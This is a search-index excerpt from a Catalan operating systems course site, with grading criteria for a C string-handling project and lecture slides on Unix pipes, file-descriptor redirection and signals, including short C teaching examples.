    "text": "üíØ Avaluaci√≥ i Criteris de Qualitat\nPer avaluar el projecte, es tindran en compte els seg√ºents aspectes:\n\n\n\nAspecte\nPuntuaci√≥ M√†xima\n\n\n\n\nohmy_string\n25%\n\n\nsafe_string\n25%\n\n\nsamples\n10%\n\n\nMakefile\n10%\n\n\nDocumentaci√≥\n10%\n\n\nQualitat del Codi\n20%\n\n\n\n\nohmy_string: S‚Äôavaluar√† a trav√©s dels tests autom√†tics proporcionats. Si es passen tots els tests, s‚Äôobtindr√† la puntuaci√≥ completa. Si no, es donar√† una puntuaci√≥ proporcional al nombre de tests superats.\nsafe_string: Igual que per ohmy_string, s‚Äôavaluar√† a trav√©s dels tests autom√†tics proporcionats.\nsamples: S‚Äôavaluar√† la qualitat, simplicitat i creativitat dels exemples proporcionats a la carpeta samples/.\nMakefile: S‚Äôavaluar√† la correcta configuraci√≥ del Makefile, assegurant que compili totes les parts del projecte de manera eficient i sense errors.\nDocumentaci√≥: S‚Äôavaluar√† la profesionalitat i el contingut del fitxer README.md, assegurant que explica:\n\nCom compilar i executar el projecte.\nCom utilitzar les llibreries.\nExemples d‚Äô√∫s de les llibreries.\nDistribuci√≥ de tasques entre els membres de l‚Äôequip (si escau).\n\nQualitat del Codi:\n\nEvitar l‚Äô√∫s de funcions repetides o codi duplicat innecess√†riament.\nCodi net i ben estructurat.\nCompilaci√≥ sense warnings.\nGesti√≥ correcta de la mem√≤ria (sense fugues ni accessos fora de l√≠mits).\n√ös adequat de comentaris i noms de variables descriptius.\nDocumentaci√≥ basada en est√†ndards com Doxygen (opcional per√≤ recomanat).\n√ös adequat de commits en Git, amb missatges clars i descriptius.\nGesti√≥ d‚Äôissues.\nGeneraci√≥ de realease al repositori GitHub amb la versi√≥ final del projecte.",
    "crumbs": [
      "Projectes",
      "Pr√†ctica 01 ¬∑ Manipulaci√≥ de Cadenes de Car√†cters en C"
    ]
  },
  {
    "objectID": "projects/project01.html#lliurament",
    "href": "projects/project01.html#lliurament",
    "title": "Pr√†ctica 01: Manipulaci√≥ de Cadenes de Car√†cters en C",
    "section": "üì¶ Lliurament",
    "text": "üì¶ Lliurament\nTot el codi i els fitxers del projecte s‚Äôhan de pujar al repositori GitHub assignat per a la pr√†ctica. √âs imprescindible assegurar-se que l‚Äôexecuci√≥ de la comanda make compili tot el projecte sense errors ni warnings i que tots els tests autom√†tics s‚Äôhagin superat correctament. Es valorar√† √∫nicament el codi de la branca principal (main o master).\nPer formalitzar el lliurament al Campus Virtual, copieu i enganxeu el text corresponent a la caixa de text de lliurament del Campus:\nIndividual o Grupal: [Indicar si √©s Individual o Grupal]\n&lt;Si Grupal&gt;\nMembres: [Llista de Noms, incloent el teu]\nTeam: [Nom del Team al Classroom]\n\n\nHappy Coding! üöÄ",
    "crumbs": [
      "Projectes",
      "Pr√†ctica 01 ¬∑ Manipulaci√≥ de Cadenes de Car√†cters en C"
    ]
  },
  {
    "objectID": "slides/03-pipes.html#implementaci√≥-de-les-pipes",
    "href": "slides/03-pipes.html#implementaci√≥-de-les-pipes",
    "title": "Pipes i redirecci√≥ d‚Äôentrada/sortida",
    "section": "Implementaci√≥ de les Pipes",
    "text": "Implementaci√≥ de les Pipes\nLes pipes es poden implementar com a buffers circulars basats en mem√≤ria assignada pel sistema operatiu. Aquestes pipes es coneixen com a pipes sense nom i s√≥n transit√≤ries. Una pipe sense nom deixa d‚Äôexistir quan tots els processos que la tenen assiganda acaben o tanquen els seus descriptors associats a la pipe.\n\n\n\nEls pipes es creen en el moment que s‚Äôobren mitjan√ßant la crida a sistema pipe() (unistd.h) o amb la sintaxis |."
  },
  {
    "objectID": "slides/03-pipes.html#creaci√≥-de-pipes",
    "href": "slides/03-pipes.html#creaci√≥-de-pipes",
    "title": "Pipes i redirecci√≥ d‚Äôentrada/sortida",
    "section": "Creaci√≥ de Pipes",
    "text": "Creaci√≥ de Pipes\nint pipe(int desc[2]);                                                                                                \nRETORNA:  0 on success                                                       \n         -1 on error:    errno = EMFILE (no free descriptors)                  \n                                 EMFILE (system file table is full)            \n                                 EFAULT (fd array is not valid)                \n\nLa crida a sistema pipe(), crea dos descriptors de fitxer. Un de lectura (desc[0]) i un d‚Äôescriptura (desc[1]).\nLa informaci√≥ que s‚Äôescriu per desc[1] es llegeix per desc[0].\nUna vegada el pipe() s‚Äôha creat; per poder utilitzar-lo els processos han d‚Äôheretar aquests descriptors del proc√©s pare."
  },
  {
    "objectID": "slides/03-pipes.html#comunicaci√≥-unidireccional-i",
    "href": "slides/03-pipes.html#comunicaci√≥-unidireccional-i",
    "title": "Pipes i redirecci√≥ d‚Äôentrada/sortida",
    "section": "Comunicaci√≥ unidireccional (I)",
    "text": "Comunicaci√≥ unidireccional (I)"
  },
  {
    "objectID": "slides/03-pipes.html#comunicaci√≥-unidireccional-ii",
    "href": "slides/03-pipes.html#comunicaci√≥-unidireccional-ii",
    "title": "Pipes i redirecci√≥ d‚Äôentrada/sortida",
    "section": "Comunicaci√≥ unidireccional (II)",
    "text": "Comunicaci√≥ unidireccional (II)"
  },
  {
    "objectID": "slides/03-pipes.html#comunicaci√≥-unidireccional-iii",
    "href": "slides/03-pipes.html#comunicaci√≥-unidireccional-iii",
    "title": "Pipes i redirecci√≥ d‚Äôentrada/sortida",
    "section": "Comunicaci√≥ unidireccional (III)",
    "text": "Comunicaci√≥ unidireccional (III)"
  },
  {
    "objectID": "slides/03-pipes.html#comunicaci√≥-unidireccional-iv",
    "href": "slides/03-pipes.html#comunicaci√≥-unidireccional-iv",
    "title": "Pipes i redirecci√≥ d‚Äôentrada/sortida",
    "section": "Comunicaci√≥ unidireccional (IV)",
    "text": "Comunicaci√≥ unidireccional (IV)\nvoid main(){\n   int fd[2]; // Descriptors associats a una pipe  \n   pid_t   pidFill;\n    /* El primer element de la matriu (fd[0]) est√† configurat i obert per \n    a la lectura, mentre que el segon element est√† configurat i obert per \n    escriure (fd[1]. Totes les dades que viatgen per la pipe es mouen \n    pel nucli. */\n    pipe(fd); pidFill = fork();\n     if (pidFill == -1){\n        perror(\"fork\"); exit(1);\n     } else if (pidFill == 0){\n         /*El proc√©s fill tanca la escriptura per la pipe*/ close(fd[1]);\n     } else {\n         /* El proc√©s pare tanca la lectura per la pipe */ close(fd[0]);\n     }\n }"
  },
  {
    "objectID": "slides/03-pipes.html#comunicaci√≥-bidireccional-v",
    "href": "slides/03-pipes.html#comunicaci√≥-bidireccional-v",
    "title": "Pipes i redirecci√≥ d‚Äôentrada/sortida",
    "section": "Comunicaci√≥ bidireccional (V)",
    "text": "Comunicaci√≥ bidireccional (V)\n\nEl proc√©s pare necessitar√† dues pipes (una per cada direcci√≥).\nEl pare fa un fork() creant una c√≤pia del pare i duplicant els descriptors de fitxers associats a les dues pipes.\nEl proc√©s pare tanca la lectura de la sortida del pipe1.\nEl proc√©s fill tanca l‚Äôescriptura a l‚Äôentrada del pipe1.\nEl proc√©s fill tanca la lectura de la sortida del pipe2.\nEl proc√©s pare tanca l‚Äôescriptura a l‚Äôentrada del pipe2."
  },
  {
    "objectID": "slides/03-pipes.html#comunicaci√≥-bidireccional-pipes",
    "href": "slides/03-pipes.html#comunicaci√≥-bidireccional-pipes",
    "title": "Pipes i redirecci√≥ d‚Äôentrada/sortida",
    "section": "Comunicaci√≥ bidireccional (Pipes)",
    "text": "Comunicaci√≥ bidireccional (Pipes)\n\n\nPipe 1\n\n\nPipe2"
  },
  {
    "objectID": "slides/03-pipes.html#escriptura-en-les-pipes",
    "href": "slides/03-pipes.html#escriptura-en-les-pipes",
    "title": "Pipes i redirecci√≥ d‚Äôentrada/sortida",
    "section": "Escriptura en les pipes",
    "text": "Escriptura en les pipes\n\nL‚Äôescriptura a les pipes es realitza utilitzant la crida a sistema: write() o la funci√≥ fprintf().\nSi un proc√©s escriu en un pipe que tingui el descriptor de lectura tancat, write() falla i s‚Äôenvia un senyal SIGPIPE.\nSi un proc√©s escriu menys bytes dels que admet el pipe, l‚Äôescriptura es realitza de forma at√≤mica.\nSi s‚Äôintenta escriure sobre un pipe ple; el proc√©s es queda bloquejat fins que el pipe es buidi (un altre proc√©s ha llegit les dades) i llavors s‚Äôacaba l‚Äôescriptura."
  },
  {
    "objectID": "slides/03-pipes.html#lectura-de-les-pipes",
    "href": "slides/03-pipes.html#lectura-de-les-pipes",
    "title": "Pipes i redirecci√≥ d‚Äôentrada/sortida",
    "section": "Lectura de les pipes",
    "text": "Lectura de les pipes\n\nLa lectura dels pipes es fan mitjan√ßant la crida a sistema: read() o la funci√≥ fscanf().\nSi un proc√©s llegeix en un pipe que tingui el descriptor tancat, retorna un 0, indicant la condici√≥ de final de fitxer.\nSi un proc√©s llegeix d‚Äôun pipe buit es bloqueja fins que les dades estiguin disponibles.\nSi un proc√©s intenta llegir m√©s dades que les disponibles en un pipe, es llegeixen els disponibles i es retorna el nombre de bytes llegits."
  },
  {
    "objectID": "slides/03-pipes.html#exemple-lector-escriptor-i",
    "href": "slides/03-pipes.html#exemple-lector-escriptor-i",
    "title": "Pipes i redirecci√≥ d‚Äôentrada/sortida",
    "section": "Exemple: Lector-Escriptor (I)",
    "text": "Exemple: Lector-Escriptor (I)\n\n\nLector\nint main() {\n    int fd[2];\n    pid_t p1 = fork();\n\n    if (p1 &gt; 0) {\n    {\n      close(fd[1]);  \n      char buf[100];\n      read(fd[0], buf, sizeof(buf));\n      printf(\"MSG: %s\\n\",buf);\n      close(fd[0]);  \n    }\n\nEscriptor\nelse if (p1 == 0) {\n    close(fd[0]);  \n    char msg[5];\n    sprintf(msg, \"msg1\");\n    write(fd[1], msg, strlen(msg));\n    close(fd[1]);  \n    exit(0);\n  }\n}"
  },
  {
    "objectID": "slides/03-pipes.html#exemple-lector-escriptor-ii",
    "href": "slides/03-pipes.html#exemple-lector-escriptor-ii",
    "title": "Pipes i redirecci√≥ d‚Äôentrada/sortida",
    "section": "Exemple: Lector-Escriptor (II)",
    "text": "Exemple: Lector-Escriptor (II)\n\n\nPare\nint main() {\n  int fd[2]; int r = pipe(fd);\n  pid_t p1 = fork();\n  if (p1 == 0) { /*Fill*/ }\n  close(fd[1]);\n  char buf[100];\n  while(read(fd[0],&buf,sizeof(buf))){\n    printf(\"I got a message! \n      It was %s\\n\", buf);\n    }\n  printf(\"No more messages :(\\n\");\n  close(fd[0]);\n}\n\nFill\nclose(fd[0]);\nchar msg[5];\nsprintf(msg,\"msg1\");\nssize_t nw = write(fd[1], \n    msg, strlen(msg));\nsprintf(msg,\"msg2\");\nnw = write(fd[1], \n    msg, strlen(msg));\nclose(fd[1]); \nwhile(1);\nexit(0);"
  },
  {
    "objectID": "slides/03-pipes.html#exemple-lector-escriptor-iii",
    "href": "slides/03-pipes.html#exemple-lector-escriptor-iii",
    "title": "Pipes i redirecci√≥ d‚Äôentrada/sortida",
    "section": "Exemple: Lector-Escriptor (III)",
    "text": "Exemple: Lector-Escriptor (III)\n\n\nPare\nint main() {\n  int fd[2]; int r = pipe(fd);\n  pid_t p1 = fork();\n  if (p1 == 0) { /*Fill*/ }\n  close(fd[1]);\n  char buf[100];\n  while(read(fd[0],&buf,sizeof(buf))){\n    printf(\"I got a message! \n      It was %s\\n\", buf);\n    }\n  printf(\"No more messages :(\\n\");\n  close(fd[0]);\n}\n\nFill\nclose(fd[0]);\nchar msg[5];\nsprintf(msg,\"msg1\");\nssize_t nw = write(fd[1], \n    msg, strlen(msg));\nsprintf(msg,\"msg2\");\nnw = write(fd[1], \n    msg, strlen(msg));\n//close(fd[1]);  &lt;-\nwhile(1);\nexit(0);"
  },
  {
    "objectID": "slides/03-pipes.html#exemple-lector-escriptor-iv",
    "href": "slides/03-pipes.html#exemple-lector-escriptor-iv",
    "title": "Pipes i redirecci√≥ d‚Äôentrada/sortida",
    "section": "Exemple: Lector-Escriptor (IV)",
    "text": "Exemple: Lector-Escriptor (IV)\n\n\nPare\nvoid sigpipe_handler(int signum) {\n    printf(\"SIGPIPE...\\n\");\n    exit(EXIT_SUCCESS);\n}\nint main() {\n  int fd[2]; int r = pipe(fd);\n  pid_t p1 = fork();\n  if (p1 == 0) { /*Fill*/ }\n    close(fd[1]);  \n    signal(SIGPIPE, sigpipe_handler);\n    write(fd[1], \"Hello\", 5);\n}\n\nFill\nclose(fd[0]);  \nsleep(2);  \nclose(fd[1]);  \nexit(EXIT_SUCCESS);"
  },
  {
    "objectID": "slides/03-pipes.html#redirecci√≥-i-duplicats",
    "href": "slides/03-pipes.html#redirecci√≥-i-duplicats",
    "title": "Pipes i redirecci√≥ d‚Äôentrada/sortida",
    "section": "Redirecci√≥ i duplicats",
    "text": "Redirecci√≥ i duplicats\nPer utilitzar pipes amb la crida a sistema exec i simular el comportament del sistema operatiu quan interactuem amb la shell, necessitem redireccionar la sortida i l‚Äôentrada de la pipe a descriptors de fitxers predefinits assignats a cada proc√©s.\n\n\n\n\nTancant els descriptors est√†ndard.\nDuplicant els descriptors de fitxer utilitzant la crida a sistema dup()(unistd.h)."
  },
  {
    "objectID": "slides/03-pipes.html#dup-i-dup2",
    "href": "slides/03-pipes.html#dup-i-dup2",
    "title": "Pipes i redirecci√≥ d‚Äôentrada/sortida",
    "section": "dup() i dup2()",
    "text": "dup() i dup2()\nint dup(int fdold)\nint dup2(int fdold, int fdnew)\n\ndup: utilitza el descriptor de fitxer lliure m√©s petit per duplicar el descriptor de fitxer fdold.\ndup2: fa que fdnew sigui una c√≤pia de fdold, tancant fdold si √©s necessari."
  },
  {
    "objectID": "slides/03-pipes.html#exemple-a-linux-ls-wc--l-i",
    "href": "slides/03-pipes.html#exemple-a-linux-ls-wc--l-i",
    "title": "Pipes i redirecci√≥ d‚Äôentrada/sortida",
    "section": "Exemple a linux: ls | wc -l (I)",
    "text": "Exemple a linux: ls | wc -l (I)"
  },
  {
    "objectID": "slides/03-pipes.html#exemple-a-linux-ls-wc--l-ii",
    "href": "slides/03-pipes.html#exemple-a-linux-ls-wc--l-ii",
    "title": "Pipes i redirecci√≥ d‚Äôentrada/sortida",
    "section": "Exemple a linux: ls | wc -l (II)",
    "text": "Exemple a linux: ls | wc -l (II)\n\nEl proc√©s 1 far√† un recobriment de la comanda ls i l‚Äôexecutar√†. Per defecte la comanda ls imprimeix per stdout el llistat de fitxers i directoris del directori actual.\nEn aquest cas la pipe (|) indica que ls no escriur√† per stdout i ho far√† per la pipe. D‚Äôaquesta manera no veurem el llista de fitxers a la terminal, seran enviats a la pipe.\nEl proc√©s 2 far√† un recobriment de la comanda wc -l, aquesta comanda compta el nombre de l√≠nies rebudes per stdin. En aquest cas, com tenim la comanda precedida d‚Äôuna pipe‚Ä¶ El proc√©s redireccionar√† stdin a la pipe. Per tant, llegir√† el contingut escrit per la comanda ls.\nPer defecte la comanda wc -l escriu a stdout, com ara no hi ha cap m√©s pipe. Aquesta sortida no es redirecciona i per tant √∫nicament veurem el resultat per stdout. √âs a dir, el nombre de fitxers i directoris del directori actual."
  },
  {
    "objectID": "slides/03-pipes.html#exemple-a-linux-ls-wc--l-iii",
    "href": "slides/03-pipes.html#exemple-a-linux-ls-wc--l-iii",
    "title": "Pipes i redirecci√≥ d‚Äôentrada/sortida",
    "section": "Exemple a linux: ls | wc -l (III)",
    "text": "Exemple a linux: ls | wc -l (III)"
  },
  {
    "objectID": "slides/03-pipes.html#implementaci√≥-amb-c-ls-wc--l",
    "href": "slides/03-pipes.html#implementaci√≥-amb-c-ls-wc--l",
    "title": "Pipes i redirecci√≥ d‚Äôentrada/sortida",
    "section": "Implementaci√≥ amb C ls | wc -l",
    "text": "Implementaci√≥ amb C ls | wc -l\nint main(int argc, char *argv[]){\nint fd[2];\nchar *p1[] = {\"ls\", NULL};\nchar *p2[] = {\"wc\", \"-l\", NULL};\nif (pipe(fd)&lt;0){ perror(\"Error de creaci√≥ del pipe fd[]\");exit(-1);}\n\nint pid1;int pid2;\nswitch (pid1 = fork()){\n    case -1: perror(\"Error fork()\"); exit(-2); break;\n    case 0: //@TODO\n}\nswitch (pid2 = fork()){\n    case -1: perror(\"Error fork()\"); exit(-2); break;\n    case 0: //@TODO\n}\nwaitpid(pid1,0,0); \nwaitpid(pid2,0,0);\n}"
  },
  {
    "objectID": "slides/03-pipes.html#implementaci√≥-amb-c-ls-wc--l-1",
    "href": "slides/03-pipes.html#implementaci√≥-amb-c-ls-wc--l-1",
    "title": "Pipes i redirecci√≥ d‚Äôentrada/sortida",
    "section": "Implementaci√≥ amb C ls | wc -l",
    "text": "Implementaci√≥ amb C ls | wc -l\nFill 1 (ls)\nif (close(pfd[0]) == -1)                    \n    perror(\"close 1\");\n\n    /* Duplicate stdout on write end of pipe; \n    close duplicated descriptor */\n\n    if (fd[1] != STDOUT_FILENO) {              \n        if (dup2(fd[1], STDOUT_FILENO) == -1)\n            perror(\"dup2 1\");\n        if (close(fd[1]) == -1)\n            perror(\"close 2\");\n    }\n\n    execlp(\"ls\", \"ls\", (char *) NULL);          \n    perror(\"execlp ls\");"
  },
  {
    "objectID": "slides/03-pipes.html#implementaci√≥-amb-c-ls-wc--l-2",
    "href": "slides/03-pipes.html#implementaci√≥-amb-c-ls-wc--l-2",
    "title": "Pipes i redirecci√≥ d‚Äôentrada/sortida",
    "section": "Implementaci√≥ amb C ls | wc -l",
    "text": "Implementaci√≥ amb C ls | wc -l\nFill 2 (wc -l)\n   if (close(fd[1]) == -1)                    \n        perror(\"close 3\");\n\n    /* Duplicate stdin on read end of pipe; \n    close duplicated descriptor */\n\n    if (fd[0] != STDIN_FILENO) {              \n        if (dup2(fd[0], STDIN_FILENO) == -1)\n            perror(\"dup2 2\");\n        if (close(fd[0]) == -1)\n            perror(\"close 4\");\n    }\n\n    execlp(\"wc\", \"wc\", \"-l\", (char *) NULL);\n    perror(\"execlp wc\");"
  },
  {
    "objectID": "slides/03-pipes.html#implementaci√≥-amb-c-ls-wc--l-3",
    "href": "slides/03-pipes.html#implementaci√≥-amb-c-ls-wc--l-3",
    "title": "Pipes i redirecci√≥ d‚Äôentrada/sortida",
    "section": "Implementaci√≥ amb C ls | wc -l",
    "text": "Implementaci√≥ amb C ls | wc -l\n\nCom √©s que el programa no acaba mai?\n\nEl proc√©s pare ha de tancar els descriptors de fitxer que no utilitza. Si no els proc√©s fill lector de la pipe no acaba mai. Ja que no tots els processos han tancat els descriptors de fitxer associats a la pipe.\n// Pare\nif (close(fd[0]) == -1)\n    perror(\"close\");\nif (close(fd[1]) == -1)\n    perror(\"close\");\n\nwaitpid(pid1,0,0);\nwaitpid(pid2,0,0);"
  },
  {
    "objectID": "slides/03-pipes.html#aix√≤-√©s-tot-per-avui",
    "href": "slides/03-pipes.html#aix√≤-√©s-tot-per-avui",
    "title": "Pipes i redirecci√≥ d‚Äôentrada/sortida",
    "section": "Aix√≤ √©s tot per avui",
    "text": "Aix√≤ √©s tot per avui\n\n\nTAKE HOME MESSAGE\nLes pipes s√≥n mecanismes de comunicaci√≥ entre processos que permeten la transmissi√≥ de dades d‚Äôun proc√©s a un altre. Es poden utilitzar per a comunicaci√≥ unidireccional o bidireccional. Cal comprendre com crear pipes, escriure i llegir dades en elles, i com utilitzar-les en la redirecci√≥ d‚Äôentrada/sortida de processos en execuci√≥."
  },
  {
    "objectID": "slides/03-signals.html#qu√®-s√≥n-els-senyals",
    "href": "slides/03-signals.html#qu√®-s√≥n-els-senyals",
    "title": "Senyals",
    "section": "Qu√® s√≥n els senyals?",
    "text": "Qu√® s√≥n els senyals?\nUn senyal √©s una notificaci√≥ as√≠ncrona enviada pel nucli a un proc√©s per informar d‚Äôun esdeveniment (com una excepci√≥ o acci√≥ de l‚Äôusuari).\nint x = 0;\nint y = 5 / x;\n\nEl proc√©s A s‚Äôexecuta en mode usuari.\nEs produeix una excepci√≥ (divisi√≥ per zero).\nEl nucli detecta l‚Äôerror i envia al proc√©s un senyal SIGFPE.\nEl proc√©s pot tenir una rutina de tractament o seguir l‚Äôacci√≥ per defecte (acabar).\nEl proc√©s A es finalitza, degut al Gestor de senyals.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#flux-dels-esdeveniments",
    "href": "slides/03-signals.html#flux-dels-esdeveniments",
    "title": "Senyals",
    "section": "Flux dels esdeveniments",
    "text": "Flux dels esdeveniments\n\n\n\n\n\nsequenceDiagram \n    participant K as Nucli\n    participant A as Proc√©s A\n    A-&gt;&gt;K: Excepci√≥ (divisi√≥ per zero)\n    K-&gt;&gt;A: Envia senyal SIGFPE al proc√©s A\n    A-&gt;&gt;A: T√© rutina de gesti√≥ de senyal?\n    alt S√≠\n        A-&gt;&gt;A: Executa rutina de gesti√≥ de senyal\n    else No\n        A-&gt;&gt;K: Acci√≥ per defecte (finalitza proc√©s)\n    end",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#tipus-desdeveniments",
    "href": "slides/03-signals.html#tipus-desdeveniments",
    "title": "Senyals",
    "section": "Tipus d‚Äôesdeveniments",
    "text": "Tipus d‚Äôesdeveniments\nEls esdeveniments que generen senyals poden provenir de maquinari o programari.\n\n\n\n\n\n\n\n\n\n\nTipus\nOrigen\nGesti√≥\nExemple\nDestinaci√≥\n\n\n\n\nInterrupci√≥ HW\nDispositiu extern\nGestor d‚Äôinterrupcions\nTick del temporitzador\nNucli\n\n\nExcepci√≥ SW\nInstrucci√≥ err√≤nia\nNucli ‚Üí envia senyal\nDivisi√≥ per zero ‚Üí SIGFPE\nProc√©s causant\n\n\nSenyal\nUsuari, proc√©s o nucli\nkill(), signal()\nkill(pid, SIGTERM)\nProc√©s destinatari",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#exemple-pr√†ctic",
    "href": "slides/03-signals.html#exemple-pr√†ctic",
    "title": "Senyals",
    "section": "Exemple pr√†ctic",
    "text": "Exemple pr√†ctic\nQuants senyals estem enviant? Quines? Quina acci√≥ fa el proc√©s quan rep els senyals?\n\n\nyes &gt; /dev/null\nctrl+z\nbg\nctrl+c\n\n\n\n\n\n\nCombinaci√≥\nSenyal\nEfecte per defecte\nEstat\n\n\n\n\nCtrl+C\nSIGINT\nTerminar proc√©s\nMort\n\n\nCtrl+Z\nSIGTSTP\nAturar proc√©s\nStopped\n\n\nbg\nSIGCONT\nReprendre en segon pla\nRunning\n\n\nfg\nSIGCONT\nReprendre en primer pla\nRunning\n\n\n\n\n\nQuants senyals estem enviant? 3\nQuines? SIGTSTP, SIGINT, SIGCONT\nQuina acci√≥ fa el proc√©s quan rep les senyals? Aturar l‚Äôexecuci√≥ en primer pla i portar el proc√©s a segon pla. Arrancar l‚Äôexecuci√≥ en segon pla. Acabar el proc√©s.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#exemple-pr√†ctic-pas-a-pas",
    "href": "slides/03-signals.html#exemple-pr√†ctic-pas-a-pas",
    "title": "Senyals",
    "section": "Exemple pr√†ctic: Pas a Pas",
    "text": "Exemple pr√†ctic: Pas a Pas\n\nLa comanda yes&gt;/dev/null crear√† un proc√©s A i s‚Äôexecuta al primer pla, quan un usuari pitj√† el ctrl-z, el kernel autom√†ticament envia un senyal SIGSTOP al proc√©s A, que modifica el seu estat d‚Äôexecuci√≥ a parat i tamb√© marxa del primer pla al segon pla.\nDespr√©s amb la comanda bg, el kernel tramet al proc√©s el senyal SIGCONT i continua la seva execuci√≥ en segon pla quan la rep. Una altra manera equivalent per realitzar aquest proc√©s √©s yes&gt;/dev/null & on & ens envia l‚Äôordre directament en execuci√≥ al background.\nObserveu tamb√© com de forma similar la comanda fg; en aquest cas el kernel tramet SIGCONT i el proc√©s quan rep SIGCONT; torna a executar-se al primer pla. Noteu que amb ctrl-c tenim un comportament similar; i el proc√©s en primer pla √©s acabat en rebre el senyal SIGINT (ctrl+c).",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#diagrama-de-canvis-destat",
    "href": "slides/03-signals.html#diagrama-de-canvis-destat",
    "title": "Senyals",
    "section": "Diagrama de canvis d‚Äôestat",
    "text": "Diagrama de canvis d‚Äôestat",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#esdeveniments-s√≠ncrons-i-as√≠ncrons",
    "href": "slides/03-signals.html#esdeveniments-s√≠ncrons-i-as√≠ncrons",
    "title": "Senyals",
    "section": "Esdeveniments s√≠ncrons i as√≠ncrons",
    "text": "Esdeveniments s√≠ncrons i as√≠ncrons\n\n\n\n\n\n\n\n\nTipus d‚Äôesdeveniment\nExemple\nSincronia\n\n\n\n\nExcepci√≥ (SIGFPE)\nDivisi√≥ per zero\nS√≠ncron amb l‚Äôexecuci√≥\n\n\nSenyal extern (SIGINT)\nCtrl+C\nAs√≠ncron (pot arribar en qualsevol moment)\n\n\n\n\nUn esdeveniment √©s s√≠ncron quan est√† relacionat amb l‚Äôexecuci√≥ del proc√©s, per exemple una excepci√≥ com la divisi√≥ per zero o un error de segmentaci√≥. En aquest cas el proc√©s que ha causat l‚Äôesdeveniment √©s el mateix que rep el senyal.\nUn esdeveniment √©s as√≠ncron quan no est√† relacionat amb l‚Äôexecuci√≥ del proc√©s, per exemple una interrupci√≥ de maquinari o una acci√≥ de l‚Äôusuari com un ctrl+c. En aquest cas el proc√©s que ha causat l‚Äôesdeveniment √©s diferent del proc√©s que rep el senyal.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#esquema-general",
    "href": "slides/03-signals.html#esquema-general",
    "title": "Senyals",
    "section": "Esquema general",
    "text": "Esquema general",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#rutines-de-tractament-de-senyals",
    "href": "slides/03-signals.html#rutines-de-tractament-de-senyals",
    "title": "Senyals",
    "section": "Rutines de Tractament de senyals",
    "text": "Rutines de Tractament de senyals\nQuan el proc√©s rebi el senyal signum executar√† gestor, que pot ser una funci√≥ o SIG_DFL, acci√≥ per defecte, o SIG_IGN per ignorar el senyal.\n#include &lt;signal.h&gt; \ntypedef void (*sighandler_t)(int);\nsighandler_t signal(int signum, sighandler_t gestor);\nValors de retorn\n\nEn cas d‚Äô√®xit retorna un punter a la anterior funci√≥ gestora del senyal.\nEn cas d‚Äôerror, retorna SIG_ERR.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#pause",
    "href": "slides/03-signals.html#pause",
    "title": "Senyals",
    "section": "pause()",
    "text": "pause()\nLa crida a sistema pause() s‚Äôutilitza per posar en espera un proc√©s fins que rep un senyal.\n#include &lt;unistd.h&gt; \nint pause(void);\n\nSempr√© retorna -1.\nEs bloqueja fins que el proc√©s rep un senyal (qualsevol).",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#gesti√≥-interna-de-senyals-kernel",
    "href": "slides/03-signals.html#gesti√≥-interna-de-senyals-kernel",
    "title": "Senyals",
    "section": "Gesti√≥ interna de senyals (Kernel)",
    "text": "Gesti√≥ interna de senyals (Kernel)\n\n\n\n\n\nsequenceDiagram\n    participant U as CPU ¬∑ Mode Usuari\n    participant K as Nucli\n    participant P as PCB del Proc√©s\n\n    U-&gt;&gt;K: Interrupci√≥ / Excepci√≥ / Syscall\n    K-&gt;&gt;P: Marca senyal SIGINT com a pendent ¬∑ signal_pending |= SIGINT\n    K-&gt;&gt;P: Actualitza cua de senyals i m√†scara\n    K-&gt;&gt;U: Retorna del mode nucli ‚Üí mode usuari\n    U-&gt;&gt;P: Comprova senyals pendents ¬∑ signal_pending & ~signal_mask\n    alt Senyal amb handler\n        U-&gt;&gt;P: Executa rutina del senyal user handler\n    else Acci√≥ per defecte\n        U-&gt;&gt;K: Finalitza proc√©s (SIG_DFL)\n    end",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#crides-a-sistema",
    "href": "slides/03-signals.html#crides-a-sistema",
    "title": "Senyals",
    "section": "Crides a sistema",
    "text": "Crides a sistema\n\n\n\n\n\n\n\n\nCrida\nFunci√≥\nAcci√≥ sobre el PCB\n\n\n\n\nsigprocmask(int how, const sigset_t *set, sigset_t *oldset)\nBloqueja o desbloqueja senyals.\nModifica signal_mask.\n\n\nsigpending(sigset_t *set)\nConsulta els senyals pendents.\nLlegeix signal_pending.\n\n\nsigaction(int signum, const struct sigaction *act, struct sigaction *oldact)\nDefineix un manejador per un senyal concret.\nModifica handlers[].\n\n\nsigqueue(pid_t pid, int sig, const union sigval value)\nEnvia un senyal amb una dada associada.\nAfegeix entrada a queue.\n\n\nalarm(unsigned int sec)\nPrograma l‚Äôenviament de SIGALRM.\nConfigura alarm_timer.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Senyals"
    ]
  },
  {
    "objectID": "slides/03-signals.html#gesti√≥-de-senyals-en-c",
    "href": "slides/03-signals.html#gesti√≥-de-senyals-en-c",
    "title": "Senyals",
    "section": "Gesti√≥ de senyals en C",
